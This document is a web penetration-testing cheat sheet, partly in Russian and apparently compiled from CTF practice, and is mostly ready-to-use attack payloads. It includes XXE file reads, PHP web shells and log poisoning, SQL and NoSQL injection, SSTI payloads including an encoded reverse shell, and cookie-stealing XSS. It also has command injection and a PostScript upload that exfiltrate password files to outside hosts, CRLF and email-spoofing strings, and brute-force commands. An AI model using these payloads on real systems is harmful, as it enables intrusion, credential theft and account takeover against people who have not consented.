- [back](../README.md)
# Example of XXE 
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<product>
  <id>123</id>
  <name>Product XYZ</name>
  <quantity>&xxe;</quantity>
</product>
```

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=acc.php">
]>
```
---
# php 
https://github.com/Arrexel/phpbash
## rce
```
<?php echo "$ ";system($_GET['cmd']); ?>
<?php echo "$ ";system(ls); ?>
```
## get file content
```
var_dump(file_get_contents('.passwd'))
```
## php type juggling loose comparison
```
auth={"data":{"login":0,"password":[]}}
```
## php local file inclusion
```
http://10.10.62.183/?view=php://filter/read=convert.base64-encode/resource=dog/../index

?inc=php://filter/read=convert.base64-encode/resource=config.php

curl "http://10.10.62.183/" -H "User-Agent: <?php system(\$_GET['cmd']); ?>"
http://10.10.62.183/?view=dog/../../../../var/log/apache2/access.log&ext&cmd='command'
```
## php - path truncation
```
page=asd/../admin.php/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././
```
---
## php extensions to run RCE
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst
```
.php
.php3
.php4
.php5
.phtml
```
---
# NoSQL injection - Authentication
```
http://challenge01.root-me.org/web-serveur/ch38/?login[$regex]=[^admin|^test]&pass[$ne]=admin
```
# Command injection - Filter bypass
```
ip=127.0.0.1%0Acurl -X POST -d @.passwd http://o4txoihjdkeyuqp2r6udoi7sejka81wq.oastify.com
```
# Cadaver for WebDAV
---
# payload in base64 format
```
"\";echo <base64 payload> | base64 -d | bash;\""
```
---
# sql
## sqlmap
```bash
sqlmap -r req.txt --dbs
sqlmap -r req.txt -D <database_name> --tables
sqlmap -r req.txt -D <database_name> -T <table_name> --columns
sqlmap -r req.txt-p  -D <database_name> --dump-all
```
## mysql
```sql
.tables 										#to see all tables
PRAGMA table_info(<table>) 		#see information
SELECT * FROM customers			#output all info

show databases;
use DATABASE;
show tables
SELECT * FROM users
```
## mongodb
```sql
mongo
show dbs
use <db>
show collections
db.<collection>.find()

search[$ne]=string #mongodb
```
## payloads
```sql
username='gfd'+union+select+'password'+--+-&password=password

?id=2 and 'foo' 'bar' = 'foobar'     # mysql
?id=2 and 'foo'+'bar'='foobar'       # mssql
?id=2 and substring('foo',1,1) = 'f' # postgresql
?id=2 and lengthb('foo') = 3         # oracle
not previous                         # sqlite

SUBSTR('foobar', 4, 2)    #Oracle
SUBSTRING('foobar', 4, 2) #Microsoft
SUBSTRING('foobar', 4, 2) #PostgreSQL
SUBSTRING('foobar', 4, 2) #MySQL

SELECT banner FROM v$version   #oracle
SELECT version FROM v$instance #oracle
SELECT @@version               #mssql mysql
SELECT version()               #postgresql

+UNION+SELECT+BANNER,+NULL+FROM+v$version-- # oracle

'XOR(if(now()=sysdate(),sleep(5*5),0))OR'
```
### database contents
```sql
Oracle
SELECT * FROM all_tables
SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'

Microsoft
SELECT * FROM information_schema.tables
SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'

PostgreSQL
SELECT * FROM information_schema.tables
SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'

MySQL
SELECT * FROM information_schema.tables
SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
```
## mysqli
get version
```sql
UNION SELECT 1,VERSION(),3,4 -- -
```
get dbs:
```sql
UNION SELECT 1,group_concat(schema_name),3,4 FROM information_schema.schemata -- -
```
get tables;
```sql
UNION SELECT 1,group_concat(table_schema,':',table_name),3,4 FROM information_schema.tables WHERE table_schema IN ('website','second_project','dev_site')-- -
```
get columns:
```sql
UNION SELECT 1,group_concat(table_schema,':',table_name,':',column_name),3,4 FROM information_schema.columns WHERE table_schema IN ('website','second_project','dev_site')-- -
```
get users and passwords:
```sql
UNION SELECT 1,group_concat(username,':',password),3,4 FROM website.users -- - 
```
## sqlite
get tables:
```sql
union select null,tbl_name FROM sqlite_master
```
### postgres
list of tables in the database:
```sql
UNION SELECT table_name, NULL FROM information_schema.tables--
```
retrieve the details of the columns in the table:
```sql
UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_etbzqp'--
```
retrieve the usernames and passwords for all users:
```sql
UNION SELECT username_abcdef, password_abcdef FROM users_abcdef--
```
---
# ssti
```python
{% set string = "ssti" %}
{% set class = "__class__" %}
{% set mro = "__mro__" %}
{% set subclasses = "__subclasses__" %}

{% set mro_r = string|attr(class)|attr(mro) %}
{% set subclasses_r = mro_r[1]|attr(subclasses)() %}
{{ subclasses_r[420](["/usr/bin/touch","/tmp/das-ist-walter"]) }}

{% with a = request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzkwMDEgMD4mMQ== | base64 -d | bash")["read"]() %} {{a}} {% endwith %}


${{<%[%'"}}%\.
${{<%[%'"}}%\

{{7*7}}
${7*7}
<%= 7*7%>
${{7*7}}
#{7*7}

# Для обхода фильтра по .__ можно использовать |attr()
{{ ''|attr('__class__’)}}
# Можно использовать сложение строк или закодировать
{{request|attr("__"+"class"+"__")}}
{{''['\x5f\x5fclass\x5f\x5f']}}
# Также можно обратиться к атрибутам по индексу
request["__class__"]
# Кроме того, можно использовать Statements для определения переменных в темплейте
{% set string = "ssti" %}

{% set class = "__class__" %}

{{ string|attr(class)}}

{% with a = config.__class__.mro()[-1].__subclasses__() %} {{ a }} {% endwith %}
# Для обхода фильтра по __  можно использовать requests.args для передачи частей полезной нагрузки в параметрах запроса и |join для соединения элементов в одну строку
{{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}&class=class&usc=_
# Для обхода фильтра по []  можно использовать |getlist(). Данный метод возвращает всех значения, связанные с определенным ключом в запросе
{{request|attr(request.args.getlist(request.args.l)|join)}}&l=a&a=_&a=_&a=class&a=_&a=_

# В случае, если встретился фильтр по |join, можно использовать |format для форматирования строк по переданным значениями
{{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_
```
# Burp search
Go to the "Burp" > "Search" tab.
- In the search type, choose "Regular expression".
- Paste the following regex:
```r
(?i)((access_key|access_token|admin_pass|admin_user|algolia_admin_key|algolia_api_key|alias_pass|alicloud_access_key|amazon_secret_access_key|amazonaws|ansible_vault_password|aos_key|api_key|api_key_secret|api_key_sid|api_secret|api.googlemaps AIza|apidocs|apikey|apiSecret|app_debug|app_id|app_key|app_log_level|app_secret|appkey|appkeysecret|application_key|appsecret|appspot|auth_token|authorizationToken|authsecret|aws_access|aws_access_key_id|aws_bucket|aws_key|aws_secret|aws_secret_key|aws_token|AWSSecretKey|b2_app_key|bashrc password|bintray_apikey|bintray_gpg_password|bintray_key|bintraykey|bluemix_api_key|bluemix_pass|browserstack_access_key|bucket_password|bucketeer_aws_access_key_id|bucketeer_aws_secret_access_key|built_branch_deploy_key|bx_password|cache_driver|cache_s3_secret_key|cattle_access_key|cattle_secret_key|certificate_password|ci_deploy_password|client_secret|client_zpk_secret_key|clojars_password|cloud_api_key|cloud_watch_aws_access_key|cloudant_password|cloudflare_api_key|cloudflare_auth_key|cloudinary_api_secret|cloudinary_name|codecov_token|config|conn.login|connectionstring|consumer_key|consumer_secret|credentials|cypress_record_key|database_password|database_schema_test|datadog_api_key|datadog_app_key|db_password|db_server|db_username|dbpasswd|dbpassword|dbuser|deploy_password|digitalocean_ssh_key_body|digitalocean_ssh_key_ids|docker_hub_password|docker_key|docker_pass|docker_passwd|docker_password|dockerhub_password|dockerhubpassword|dot-files|dotfiles|droplet_travis_password|dynamoaccesskeyid|dynamosecretaccesskey|elastica_host|elastica_port|elasticsearch_password|encryption_key|encryption_password|env.heroku_api_key|env.sonatype_password|eureka.awssecretkey)[a-z0-9_ .\-,]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([0-9a-zA-Z\-_=]{8,64})['\"]
```

```r
aws_access_key|aws_secret_key|api key|passwd|pwd|heroku|slack|firebase|swagger|aws_secret_key|aws key|password|ftp password|jdbc|sql|secret jet|config|admin|pwd|gcp|htaccess|.env|ssh key|.git|access key|secret token|oauth_token|oauth_token_secret
```
# steal cookie
```
<script>window.location='http://<ip>:port/?cookie=' + document.cookie</script>

<script>document.write('<img src="https://site.com?cookie='+document.cookie+'"width=0 height=0 border=0 />');</script>
```
---
# brute force login
![png](./src/src_for_src/login.png)

```
hydra -l admin -P /usr/share/seclists/rockyou.txt $IP http-get /inferno
```
---
# CSRF
```
<iframe style="display:none" name="csrf-frame"></iframe>
    <form  id="csrf-form" target="csrf-frame" action="http://challenge01.root-me.org/web-client/ch22/index.php?action=profile" method="POST" enctype="multipart/form-data">
      <input type="hidden" name="username" value="user" />
      <input type="hidden" name="status" value="on" />
      <input type="submit" value="Submit request" />
    </form>
<script>document.getElementById("csrf-form").submit()</script>
```

```
как можно байпаснуть csrf: 
change method of request
intersept request, get scrf toket, drop request, paste it in csrf poc
delete scrf token
```
---
# lfi bypass
```
file/etc/passwd?/
file/etc/passwd%3F/
file/etc%252Fpasswd/
file/etc%252Fpasswd%3F/
file/etc/?/../passwd
file/etc/%3F/../passwd?
.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/etc/passwd
```
---
# LaTeX injection
```
$\lstinputlisting{/var/www/dev/.htpasswd}$
```
---
# upload bypass
```
jpg с вот таким содержимым:

%!PS
userdict /setpagedevice undef
legal
{ null restore } stopped { pop } if
legal
mark /OutputFile (var=cat /etc/shadow | base64 && curl YOUR_DOMAIN.LOL/?ssr=$var) currentdevice putdeviceprops

где твой домен точка лол - это твой домен, на который придет пинг. Я для таких целей использую либо requestbin.com, (https://api0.pw/api_0/requestbin.com) либо поднимаю ngrok.
```

```
<svg width="200" height="200" 
xmlns="http://www.w3.org/2000/svg" (http://www.w3.org/2000/svg) xmlns:xlink="http://www.w3.org/1999/xlink"> (http://www.w3.org/1999/xlink) 
<image xlink:href='YOUR_DOMAIN' x='0' y='0' height='1' width='1'/> 
</svg>
И если пинг на твой домен пришел, то ссрф прошло. Но на этом останавливаться не стоит, ведь там может быть rce (Remote Code Execution), и проверяется она точно так же, но в код svg вставляется либо курл на ваш домен, либо что-нибудь типа etc/passwd и так же отправляется на домен.
```
---
# CRLF payloads
```
%0AHeader-Test:POXEK
%0A%20Header-Test:POXEK
%20%0AHeader-Test:POXEK
%23%OAHeader-Test:POXEK
%E5%98%8A%E5%98%8DHeader-Test:POXEK
%E5%98%8A%E5%98%8D%0AHeader-Test:POXEK
%3F%0AHeader-Test:POXEK
crlf%0AHeader-Test:POXEK
crlf%0A%20Header-Test:POXEK
crlf%20%0AHeader-Test:POXEK
crlf%23%OAHeader-Test:POXEK
crlf%E5%98%8A%E5%98%8DHeader-Test:POXEK
crlf%E5%98%8A%E5%98%8D%0AHeader-Test:POXEK
crlf%3F%0AHeader-Test:POXEK
%0DHeader-Test:POXEK
%0D%20Header-Test:POXEK
%20%0DHeader-Test:POXEK
%23%0DHeader-Test:POXEK
%23%0AHeader-Test:POXEK
%E5%98%8A%E5%98%8DHeader-Test:POXEK
%E5%98%8A%E5%98%8D%0DHeader-Test:POXEK
%3F%0DHeader-Test:POXEK
crlf%0DHeader-Test:POXEK
crlf%0D%20Header-Test:POXEK
crlf%20%0DHeader-Test:POXEK
crlf%23%0DHeader-Test:POXEK
crlf%23%0AHeader-Test:POXEK
crlf%E5%98%8A%E5%98%8DHeader-Test:POXEK
crlf%E5%98%8A%E5%98%8D%0DHeader-Test:POXEK
crlf%3F%0DHeader-Test:POXEK
%0D%0AHeader-Test:POXEK
%0D%0A%20Header-Test:POXEK
%20%0D%0AHeader-Test:POXEK
%23%0D%0AHeader-Test:POXEK
\r\nHeader-Test:POXEK
 \r\n Header-Test:POXEK
\r\n Header-Test:POXEK
%5cr%5cnHeader-Test:POXEK
%E5%98%8A%E5%98%8DHeader-Test:POXEK
%E5%98%8A%E5%98%8D%0D%0AHeader-Test:POXEK
%3F%0D%0AHeader-Test:POXEK
crlf%0D%0AHeader-Test:POXEK
crlf%0D%0A%20Header-Test:POXEK
crlf%20%0D%0AHeader-Test:POXEK
crlf%23%0D%0AHeader-Test:POXEK
crlf\r\nHeader-Test:POXEK
crlf%5cr%5cnHeader-Test:POXEK
crlf%E5%98%8A%E5%98%8DHeader-Test:POXEK
crlf%E5%98%8A%E5%98%8D%0D%0AHeader-Test:POXEK
crlf%3F%0D%0AHeader-Test:POXEK
%0D%0A%09Header-Test:POXEK
crlf%0D%0A%09Header-Test:POXEK
%250AHeader-Test:POXEK
%25250AHeader-Test:POXEK
%%0A0AHeader-Test:POXEK
%25%30AHeader-Test:POXEK
%25%30%61Header-Test:POXEK
%u000AHeader-Test:POXEK
//www.google.com/%2F%2E%2E%0D%0AHeader-Test:POXEK
/www.google.com/%2E%2E%2F%0D%0AHeader-Test:POXEK
/google.com/%2F..%0D%0AHeader-Test:POXEK
```
---
# email/phone injection payloads
```
"payload"@mail.local
name@"payload"mail.local
name(payload)@mail.local
name@(payload)mail.local
name@mail.local(payload)
"'-sleep(5)-'"@mail.local.
"'-alert(5)-'"@mail.local.
"'--><script/src=//attacker.com></script>"@mail.local
"<img/src/onerror=alert(5)>"@mail.local
name(<script>alert(5)</script>)@mail.local
name@mail(<script>alert(5)</script>).local
"'OR 1=1 --'"@mail.local
```

```
+28 (global identifier), 0505552280 (number) and the following parameters such as ;ext=+28 ;isub=12345 and ;phone-context=test are optional parameters.

These are the optional parameters we are interested in. In them you can often write something of your own, thus causing a potential place under XSS,SSRF,SQL,SSTI or use ext parameter to bypass rate-limit:

+280505552280;phone-context=<script>alert(1337)</script>
+280505552280;phone-context=https://evil.com
+280505552280;phone-context=sleep(10)
+280505552280;phone-context={{4*4}}{{6+6}}
+280505552280;ext=N , where we loop over the value of N and thus bypass the rate-limit.
```
# graphql
- [graphql voyager](https://graphql-kit.com/graphql-voyager/)
```
query{__schema{queryType{name}}} # if u can inject => good
in InQL mutations = do something with data, queries = get data
```
## Full introspection query
```
query IntrospectionQuery {
	__schema {
		queryType {
			name
		}
		mutationType {
			name
		}
		subscriptionType {
			name
		}
		types {
		 ...FullType
		}
		directives {
			name
			description
			args {
				...InputValue
		}
		onOperation  #Often needs to be deleted to run query
		onFragment   #Often needs to be deleted to run query
		onField      #Often needs to be deleted to run query
		}
	}
}

fragment FullType on __Type {
	kind
	name
	description
	fields(includeDeprecated: true) {
		name
		description
		args {
			...InputValue
		}
		type {
			...TypeRef
		}
		isDeprecated
		deprecationReason
	}
	inputFields {
		...InputValue
	}
	interfaces {
		...TypeRef
	}
	enumValues(includeDeprecated: true) {
		name
		description
		isDeprecated
		deprecationReason
	}
	possibleTypes {
		...TypeRef
	}
}

fragment InputValue on __InputValue {
	name
	description
	type {
		...TypeRef
	}
	defaultValue
}

fragment TypeRef on __Type {
	kind
	name
	ofType {
		kind
		name
		ofType {
			kind
			name
			ofType {
				kind
				name
			}
		}
	}
}
```
## bb tips
1. Identifying GraphQL Targets: Start by identifying GraphQL targets using the powerful Nuclei Scanning: nuclei -u target.com -t graphql-detect.yaml (https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/9b8da6f22de63f2a146aa3e425bb40abd33f5e32/http/technologies/graphql-detect.yaml)
2. Retrieve the GraphQL Schema for hidden Query/Mutations: If Introspection is enabled, you can obtain the GraphQL Schema, revealing hidden GraphQL Operations and Mutations using the following GraphQL Query:
```
{"query":"{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}"}
```

3. Visualize with GraphQL Voyager: To visualize the GraphQL Schema effectively and craft your attack vector, use GraphQL Voyager - a powerful tool to help you navigate the schema: graphql-voyager (https://graphql-kit.com/graphql-voyager/)
4. Retrieve Hidden Queries and Mutations: Retrieve GraphQL Queries and Mutations from JavaScript files when Introspection is disabled. These files may list hidden methods not accessible via the app's regular functionality. Try making direct requests to these.
5. Craft Your Attack: Craft your attack using the identified GraphQL Queries and Mutations (https://www.youtube.com/watch?v=KOCBeJmTs78) with Inql scanner. (https://github.com/doyensec/inql) These methods are often vulnerable to various bug classes, including IDOR, RBAC, Race Condition, SQL, and more (https://habr.com/ru/companies/tomhunter/articles/676478/).
If you can't find more GraphQL Queries and Mutations, don't worry! Stay tuned for upcoming insights on how to brute force and discover hidden ones.
Takeaways: Don't hit a dead end with GraphQL apps. Dive deeper, find those concealed GraphQL Queries and Mutations, and unlock unimaginable functionalities that can lead to significant bounties!
# csrf json
Вместо `application/json` ставим `application/x-www-form-urlencoded`, а тело запроса оставляем прежним :).  
Сразу хочется отметить, что burp не сгенерирует полезную нагрузку, поэтому вот сниппет, которым можно воспользоваться:

```js
<script>
let req = new XMLHttpRequest();
req.open("POST", "https://vulnerable.host/api/profile/update", false);
req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
req.withCredentials = true;

var params = '{"first_name":"riven","last_name":"riven","birthday":"01/01/1337", "password":"pwned"}';
console.log(params);
req.send(params);
</script>
```
# Crawling parameters with Katana for quick XSS/SQLI
```sh
katana -u http://domain.com -silent -d 15 -rl 500 -jc -c 20 -kf all -ct 2m -sf qurl -o urls.txt
# You can use katana with query url filter (`-f qurl`) to get list of endpoints
urless -i urls.txt -o output.txt
nuclei -l output.txt -t /opt/fuzzing-templates/ -silent
```
# Discover hidden directories:
```linux
ffuf -replay-proxy http://127.0.0.1:8080 #ffuf with proxy

subdinder -d target.com -silent | dnsx -silent | gau

cat web_def_ports | xargs -n 1 /home/toor/.local/bin/feroxbuster -d 1 -w /usr/share/SecLists/Fuzzing/bst.txt -o ferox-finaly --no-state -u

script -q /dev/null -c "cat test | xargs -n 1 /home/toor/.local/bin/feroxbuster -d 1 -w /usr/share/SecLists/Fuzzing/bst.txt -o ferox-finaly --no-state -u" > log.txt
```
---
# Discover subdomains:
```
wfuzz -c -w wordlist -u "http://domain.com" -H "Host: FUZZ.domain.com" -fw 125

ffuf -u http://domain.com -w wordlist -H "Host: FUZZ.domain.com"
```
---
# Discover files with `wfuzz` :
```
wfuzz -c -w /usr/share/dirb/wordlists/LFI-gracefulsecurity-linux.txt -u http://dev.team.thm/script.php\?page\=FUZZ --hw=0
```
---
# Brute force wordpress
```
wpscan --url http://target_on_wp.com/ -e u -P /usr/share/wordlists/rockyou.txt
```
---
# email injection
```
attacker@[testText\r\nRSET\r\nMAIL FROM: <spoofed@example.org>\r\nRCPT TO: <victim@example.org>\r\nDATA\r\nFrom: spoofed@example.org\r\n\r\nText\r\n.\r\nQUIT\r\n]
```

```
"Spoofed"
<attacker@outlook.com>: spoofed@outlook.com
```

```
<spoofed@gmail.com> "spoofed" <attacker@gmail.com>
```

```
Attacker
<spoofed@gmail.com>:<attacker@gmail.com>
```

```
": <attacker@gmail.com> "<spoofed@gmail.com>"
```
# http headers to bypass
```
X-Originating-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Forwarded: 127.0.0.1
Forwarded-For: 127.0.0.1
X-Forwarded-Host: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-ProxyUser-Ip: 127.0.0.1
X-Original-URL: 127.0.0.1
Client-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Host: 127.0.0.1
True-Client-IP: 127.0.0.1
Cluster-Client-IP: 127.0.0.1
Via: 1.0 fred, 1.1 127.0.0.1
```
# links
- [steal admin cookie/sqli](./src/marketplace.md) (tryhackme:marketplace)
- [ohmyweb](./src/omyweb.md)
